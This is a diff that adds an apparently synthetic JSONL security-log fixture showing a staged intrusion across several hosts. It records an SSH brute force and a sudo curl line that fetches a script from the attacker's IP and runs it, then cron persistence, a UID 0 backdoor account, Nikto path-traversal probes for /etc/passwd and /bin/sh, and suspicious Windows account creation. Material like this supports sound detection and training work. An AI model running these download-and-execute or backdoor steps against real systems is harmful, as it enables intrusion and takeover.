@@ -1,0 +1,40 @@
+{"timestamp": "2026-08-28T02:14:00Z", "host": "web-01", "source": "sshd", "message": "Failed password for root from 185.220.101.47 port 51000 ssh2", "severity": "warning"}
+{"timestamp": "2026-08-28T02:14:02Z", "host": "web-01", "source": "sshd", "message": "Failed password for invalid user admin from 185.220.101.47 port 51001 ssh2", "severity": "warning"}
+{"timestamp": "2026-08-28T02:14:04Z", "host": "web-01", "source": "sshd", "message": "Failed password for invalid user admin from 185.220.101.47 port 51002 ssh2", "severity": "warning"}
+{"timestamp": "2026-08-28T02:14:05Z", "host": "db-01", "source": "postgres", "message": "checkpoint complete: wrote 412 buffers (2.5%); 0 WAL file(s) added", "severity": "info"}
+{"timestamp": "2026-08-28T02:14:06Z", "host": "web-01", "source": "sshd", "message": "Failed password for ubuntu from 185.220.101.47 port 51003 ssh2", "severity": "warning"}
+{"timestamp": "2026-08-28T02:14:08Z", "host": "web-01", "source": "sshd", "message": "Failed password for root from 185.220.101.47 port 51004 ssh2", "severity": "warning"}
+{"timestamp": "2026-08-28T02:14:10Z", "host": "web-01", "source": "sshd", "message": "Failed password for invalid user test from 185.220.101.47 port 51005 ssh2", "severity": "warning"}
+{"timestamp": "2026-08-28T02:14:12Z", "host": "web-01", "source": "sshd", "message": "Failed password for root from 185.220.101.47 port 51006 ssh2", "severity": "warning"}
+{"timestamp": "2026-08-28T02:14:14Z", "host": "web-01", "source": "sshd", "message": "Failed password for invalid user admin from 185.220.101.47 port 51007 ssh2", "severity": "warning"}
+{"timestamp": "2026-08-28T02:14:16Z", "host": "web-01", "source": "sshd", "message": "Failed password for invalid user admin from 185.220.101.47 port 51008 ssh2", "severity": "warning"}
+{"timestamp": "2026-08-28T02:14:18Z", "host": "web-01", "source": "sshd", "message": "Failed password for ubuntu from 185.220.101.47 port 51009 ssh2", "severity": "warning"}
+{"timestamp": "2026-08-28T02:14:20Z", "host": "web-01", "source": "sshd", "message": "Failed password for root from 185.220.101.47 port 51010 ssh2", "severity": "warning"}
+{"timestamp": "2026-08-28T02:14:22Z", "host": "web-01", "source": "sshd", "message": "Failed password for invalid user test from 185.220.101.47 port 51011 ssh2", "severity": "warning"}
+{"timestamp": "2026-08-28T02:14:24Z", "host": "web-01", "source": "sshd", "message": "Failed password for root from 185.220.101.47 port 51012 ssh2", "severity": "warning"}
+{"timestamp": "2026-08-28T02:14:26Z", "host": "web-01", "source": "sshd", "message": "Failed password for invalid user admin from 185.220.101.47 port 51013 ssh2", "severity": "warning"}
+{"timestamp": "2026-08-28T02:14:28Z", "host": "web-01", "source": "sshd", "message": "Failed password for invalid user admin from 185.220.101.47 port 51014 ssh2", "severity": "warning"}
+{"timestamp": "2026-08-28T02:14:30Z", "host": "web-01", "source": "sshd", "message": "Failed password for ubuntu from 185.220.101.47 port 51015 ssh2", "severity": "warning"}
+{"timestamp": "2026-08-28T02:14:32Z", "host": "web-01", "source": "sshd", "message": "Failed password for root from 185.220.101.47 port 51016 ssh2", "severity": "warning"}
+{"timestamp": "2026-08-28T02:14:34Z", "host": "web-01", "source": "sshd", "message": "Failed password for invalid user test from 185.220.101.47 port 51017 ssh2", "severity": "warning"}
+{"timestamp": "2026-08-28T02:14:41Z", "host": "web-01", "source": "sshd", "message": "Accepted password for ubuntu from 185.220.101.47 port 51019 ssh2", "severity": "notice"}
+{"timestamp": "2026-08-28T02:14:43Z", "host": "web-01", "source": "sshd", "message": "pam_unix(sshd:session): session opened for user ubuntu by (uid=0)", "severity": "info"}
+{"timestamp": "2026-08-28T02:14:58Z", "host": "web-01", "source": "sudo", "message": "ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/curl -s http://185.220.101.47:8080/x.sh -o /tmp/.x.sh", "severity": "notice"}
+{"timestamp": "2026-08-28T02:15:01Z", "host": "web-01", "source": "sudo", "message": "ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/bash /tmp/.x.sh", "severity": "notice"}
+{"timestamp": "2026-08-28T02:15:04Z", "host": "web-01", "source": "cron", "message": "(root) CMD (/tmp/.x.sh >/dev/null 2>&1)", "severity": "info"}
+{"timestamp": "2026-08-28T02:15:06Z", "host": "web-01", "source": "useradd", "message": "new user: name=sysupd, UID=0, GID=0, home=/, shell=/bin/bash", "severity": "warning"}
+{"timestamp": "2026-08-28T02:15:30Z", "host": "db-01", "source": "systemd", "message": "Started Daily apt download activities.", "severity": "info"}
+{"timestamp": "2026-08-28T02:16:00Z", "host": "web-01", "source": "nginx", "message": "203.0.113.88 - - \"GET /.env HTTP/1.1\" 404 162 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.1.6)\"", "severity": "info"}
+{"timestamp": "2026-08-28T02:16:03Z", "host": "web-01", "source": "nginx", "message": "203.0.113.88 - - \"GET /wp-login.php HTTP/1.1\" 404 162 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.1.6)\"", "severity": "info"}
+{"timestamp": "2026-08-28T02:16:06Z", "host": "web-01", "source": "nginx", "message": "203.0.113.88 - - \"GET /phpmyadmin/ HTTP/1.1\" 404 162 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.1.6)\"", "severity": "info"}
+{"timestamp": "2026-08-28T02:16:09Z", "host": "web-01", "source": "nginx", "message": "203.0.113.88 - - \"GET /cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1\" 400 162 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.1.6)\"", "severity": "info"}
+{"timestamp": "2026-08-28T02:16:12Z", "host": "web-01", "source": "nginx", "message": "203.0.113.88 - - \"GET /admin/config.php HTTP/1.1\" 404 162 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.1.6)\"", "severity": "info"}
+{"timestamp": "2026-08-28T02:16:15Z", "host": "web-01", "source": "nginx", "message": "203.0.113.88 - - \"GET /../../../../etc/passwd HTTP/1.1\" 400 162 \"-\" \"Mozilla/5.0 (compatible; Nikto/2.1.6)\"", "severity": "info"}
+{"timestamp": "2026-08-28T02:16:30Z", "host": "dc-01", "source": "Microsoft-Windows-Security-Auditing", "message": "4625: An account failed to log on. Account Name: administrador Workstation: WIN-PC07 Source Network Address: 10.10.5.23 Failure Reason: Unknown user name or bad password", "severity": "warning"}
+{"timestamp": "2026-08-28T02:16:33Z", "host": "dc-01", "source": "Microsoft-Windows-Security-Auditing", "message": "4625: An account failed to log on. Account Name: administrador Workstation: WIN-PC07 Source Network Address: 10.10.5.23 Failure Reason: Unknown user name or bad password", "severity": "warning"}
+{"timestamp": "2026-08-28T02:16:36Z", "host": "dc-01", "source": "Microsoft-Windows-Security-Auditing", "message": "4624: An account was successfully logged on. Account Name: administrador Logon Type: 10 Source Network Address: 10.10.5.23", "severity": "notice"}
+{"timestamp": "2026-08-28T02:16:50Z", "host": "dc-01", "source": "Microsoft-Windows-Security-Auditing", "message": "4720: A user account was created. New Account Name: svc_backup2 Creator: administrador", "severity": "warning"}
+{"timestamp": "2026-08-28T02:17:20Z", "host": "fw-01", "source": "firewall", "message": "DENY TCP 185.220.101.47:44121 -> 10.10.1.20:445 SMB inbound blocked", "severity": "warning"}
+{"timestamp": "2026-08-28T02:17:23Z", "host": "fw-01", "source": "firewall", "message": "DENY TCP 185.220.101.47:44122 -> 10.10.1.21:3389 RDP inbound blocked", "severity": "warning"}
+{"timestamp": "2026-08-28T02:18:00Z", "host": "web-01", "source": "systemd", "message": "Started Session 47 of user www-data.", "severity": "info"}
+{"timestamp": "2026-08-28T02:19:00Z", "host": "db-01", "source": "postgres", "message": "connection received: host=10.10.1.20 port=51877", "severity": "info"}
